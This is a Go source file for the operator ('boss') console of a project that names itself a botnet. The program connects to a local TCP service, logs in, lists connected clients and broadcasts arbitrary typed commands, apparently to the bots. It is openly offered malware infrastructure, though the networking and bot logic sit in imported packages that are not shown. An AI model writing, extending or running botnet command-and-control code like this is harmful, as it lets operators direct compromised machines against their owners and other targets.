package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"

	"github.com/phanletrunghieu/botnet/boss/service/tcp"
	"github.com/phanletrunghieu/botnet/common/cmd"
)

func main() {
	bossService := tcp.NewTCPService("127.0.0.1", 8081)
	go func() {
		err := <-bossService.Error
		log.Println(err)
	}()

	go bossService.Run()

	for {
		stdreader := bufio.NewReader(os.Stdin)
		text, err := stdreader.ReadString('\n')
		if err != nil {
			fmt.Println("[ERROR] reading input", err)
			continue
		}

		text = strings.TrimSpace(text)
		cmdArr := strings.Split(text, " ")

		if len(cmdArr) <= 0 {
			fmt.Println("[ERROR] reading input")
			continue
		}

		switch cmdArr[0] {
		case "login":
			if len(cmdArr) > 2 {
				bossService.WriteChan <- (cmdArr[1] + " " + cmdArr[2])
			}
			break
		case "list":
			if len(cmdArr) > 1 && cmdArr[1] == "clients" {
				bossService.WriteChan <- cmd.ListClients
			}
			break
		default:
			bossService.WriteChan <- (cmd.Broadcast + text)
		}
	}
}
